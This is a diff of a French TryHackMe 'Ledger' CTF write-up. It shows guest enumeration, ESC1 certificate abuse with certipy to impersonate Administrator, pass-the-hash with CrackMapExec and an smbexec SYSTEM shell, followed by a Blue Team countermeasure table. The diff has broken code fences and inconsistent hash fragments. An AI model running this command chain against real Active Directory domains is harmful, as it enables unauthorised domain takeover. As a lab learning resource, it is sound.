@@ -1,133 +1,139 @@
+Voici ton texte formaté en Markdown clair, prêt à être publié sur GitHub Pages ou un site Jekyll :
 
----
+```markdown
+# TryHackMe - Ledger – Write-up Complet (FR)
 
-````markdown
-# 🧾 TryHackMe - Ledger – Write-up Complet (FR)
-
-**Room :** [https://tryhackme.com/room/ledger](https://tryhackme.com/room/ledger)
+[https://tryhackme.com/room/ledger](https://tryhackme.com/room/ledger)
 
 ---
 
 ## 🧠 Objectif
 
 Exploiter une machine Windows Active Directory vulnérable (`labyrinth.thm.local`)  
-pour obtenir une exécution de commande en tant qu’administrateur de domaine  
-via une attaque AD CS (ESC1) et la réutilisation de hash NTLM.
+pour obtenir une exécution de commande en tant qu’administrateur de domaine via SMB et NTLM hash.
 
 ---
 
-## 🔍 1. Scan et découverte initiale
+## 🔍 1. Scan et découverte
 
-### 🔎 Scan Nmap
+### Scan nmap
 
-```bash
-nmap -Pn -sC -sV -T4 -p- labyrinth.thm.local
+---
+
+### Ajout dans `/etc/hosts` :
+
+```
+
+IPCIBLE labyrinth.thm.local thm.local LABYRINTH
+
 ````
 
-* Port 445 (SMB) ouvert : cible un contrôleur de domaine Windows.
-* Ports 389 (LDAP) et 88 (Kerberos) également ouverts : environnement Active Directory confirmé.
+- Port 445 (SMB) ouvert : cible un contrôleur de domaine Windows.
 
-### 🛠️ Préparation
+---
 
-Ajout dans `/etc/hosts` :
-
-```
-labyrinth.thm.local thm.local LABYRINTH
-```
-
-### 🧪 Tests d'accès invités
+### Test guest :
 
 ```bash
 nxc smb labyrinth.thm.local -u 'guest' -p ''
 nxc ldap labyrinth.thm.local -u 'guest' -p '' --users
-```
+````
 
-✅ Plusieurs utilisateurs récupérés.
-Deux utilisateurs partagent le même mot de passe.
+On récupère 2 utilisateurs avec le même mot de passe.
 
-### 🔐 Accès initial
+---
+
+### Connexion avec un utilisateur valide :
 
 ```bash
 nxc smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p '[REDACTED]'
 ```
 
-✅ Connexion confirmée.
-Utilisation de Remmina pour ouvrir un accès graphique RDP.
-📁 Fichier `user.txt` récupéré.
+Connexion avec Remmina (RDP).
+Récupération du flag `user.txt`.
 
 ---
 
-## 🧩 2. Exploitation d'AD CS – ESC1
+## 🧩 2. Credential reuse via NTLM hash
 
-### 🔬 Découverte de la vulnérabilité
+### Active Directory Certificate Services (AD CS)
+
+À l'aide de certipy, nous trouvons un modèle de certificat appelé `ServerAuth` vulnérable à ESC1.
+
+---
+
+### ESC1 (Enterprise Security Control 1)
+
+* Technique d’attaque contre AD CS.
+* Permet à un utilisateur de s’auto-délivrer un certificat d’authentification valide pour n’importe quel utilisateur, même un Domain Admin !
+
+---
+
+### Découverte de la vulnérabilité avec certipy :
 
 ```bash
 certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p '[REDACTED]' -target labyrinth.thm.local -stdout -vulnerable
 ```
 
-* Modèle de certificat vulnérable détecté : **ServerAuth**.
+* Droits d'inscription : `THM.LOCAL\Authenticated Users` peut s'inscrire, ce qui permet de demander le certificat.
+* Authentification client EKU : certificat utilisable pour l’authentification auprès d’Active Directory.
+* **EnrolleeSuppliesSubject** : vulnérabilité principale, permet de spécifier le sujet du certificat, donc d'usurper n'importe quel compte.
 
-### ❗ ESC1 - Détail de la faille
+---
 
-* ESC1 (Enterprise Security Control 1) permet de forger un certificat pour n’importe quel utilisateur (même Domain Admin).
-* Conditions réunies :
-
-  * `ENROLLEE_SUPPLIES_SUBJECT` activé
-  * Client Authentication EKU présent
-  * Groupe *Authenticated Users* peut s’enrôler
-
-### 📥 Requête de certificat en se faisant passer pour l'administrateur
+### Demande du certificat en se faisant passer pour l'administrateur :
 
 ```bash
 certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password '[REDACTED]' \
-  -ca thm-LABYRINTH-CA -template ServerAuth \
-  -target labyrinth.thm.local -upn Administrator@thm.local
+-ca thm-LABYRINTH-CA -target labyrinth.thm.local \
+-template ServerAuth -upn Administrator@thm.local
 ```
 
-✔️ Un certificat `.pfx` est généré.
+---
 
-### 🪪 Authentification avec le certificat
+### Authentification avec le certificat généré :
 
 ```bash
 certipy-ad auth -pfx administrator.pfx
 ```
 
-✔️ Récupération d’un hash NTLM valide du compte Administrator.
+Un hash NTLM est fourni ou découvert :
+`:07d677XXXXXXXXXXXXX322`
 
 ---
 
-## 🔁 3. Test du hash NTLM (Pass-the-Hash)
+### Test du hash avec CrackMapExec :
 
 ```bash
-cme smb labyrinth.thm.local -u Administrator -H 07d677XXXXXXX322 --kdcHost labyrinth.thm.local
+cme smb labyrinth.thm.local -u Administrator -H 07d677XXXXXXXXXX322 --kdcHost labyrinth.thm.local
 ```
 
-✔️ Accès administrateur confirmé. 🎉
+✔️ Accès confirmé : utilisateur Administrator avec un hash fonctionnel → Pass-the-Hash.
 
 ---
 
-## 🚀 4. Exécution de commande à distance (Shell SYSTEM)
+## 🚀 3. Exploitation finale
 
 ```bash
-smbexec.py -k -hashes :07d677XXXXXXX322 THM.LOCAL/Administrator@labyrinth.thm.local
+smbexec -k -hashes :07d677XXXXXXXX52322 THM.LOCAL/Administrator@labyrinth.thm.local
 ```
 
-✅ Shell SYSTEM via SMB obtenu.
-📁 Récupération de `root.txt`.
+✔️ Shell SYSTEM via SMB !
+Obtention de `root.txt`.
 
 ---
 
-## 🔐 5. Bonnes pratiques défensives (Blue Team)
+## 🛡️ 4. Bonnes pratiques défensives (Blue Team)
 
-| Problème                        | Contremesure recommandée                                    |
-| ------------------------------- | ----------------------------------------------------------- |
-| SMB exposé                      | Restreindre les accès SMB aux seuls hôtes autorisés         |
-| Pass-the-Hash NTLM              | Activer LAPS, Forcer Kerberos (désactiver NTLM si possible) |
-| ESC1 sur modèles de certificats | Désactiver `ENROLLEE_SUPPLIES_SUBJECT`, restreindre l'accès |
-| Pas de monitoring ADCS          | Auditer les requêtes de certificats                         |
-| Pas de journalisation 4625      | Activer l’audit des échecs d’authentification               |
-| Aucune segmentation réseau      | Isoler les contrôleurs de domaine                           |
-| Pas de détection post-exploit   | Déployer un SIEM avec règles sur smbexec, psexec, wmiexec   |
+| Problème exploité                                    | Contremesure recommandée                                              |
+| ---------------------------------------------------- | --------------------------------------------------------------------- |
+| Hash NTLM réutilisable (Pass-the-Hash)               | - Activer LAPS (Local Admin Password Solution)                        |
+|                                                      | - Désactiver SMBv1                                                    |
+|                                                      | - Kerberos only                                                       |
+| Pas de segmentation réseau                           | Isoler les DC, segmenter le réseau AD.                                |
+| Aucun journal d’échec (4625)                         | Auditer les logs de sécurité Windows.                                 |
+| Pas de détection post-exploitation                   | SIEM avec alertes sur smbexec, psexec, wmiexec                        |
+| Accès Admin avec mot de passe connu ou hash statique | Rotation régulière des mots de passe et monitoring des connexions SMB |
 
 ---
 
@@ -142,19 +148,21 @@ smbexec.py -k -hashes :07d677XXXXXXX322 THM.LOCAL/Administrator@labyrinth.thm.lo
 
 ## 🧠 Outils utilisés
 
-* `nxc` (NetExec)
-* `certipy`
-* `crackmapexec`
-* `smbexec.py`
+* nxc (NetExec)
+* certipy
+* crackmapexec
+* smbexec.py
 
 ---
 
 ## 📌 À retenir pour la défense
 
-* Surveillez les modèles de certificats.
-* Ne laissez pas les utilisateurs choisir leurs propres sujets.
-* Sécurisez SMB et éliminez NTLM si possible.
-* Déployez la journalisation et les alertes ADCS.
+* 🎯 Surveillez les modèles de certificats.
+* 🎯 Ne laissez pas les utilisateurs choisir leurs propres sujets.
+* 🎯 Sécurisez SMB et éliminez NTLM si possible.
+* 🎯 Déployez la journalisation et les alertes ADCS.
+
+```
 
 ---
 
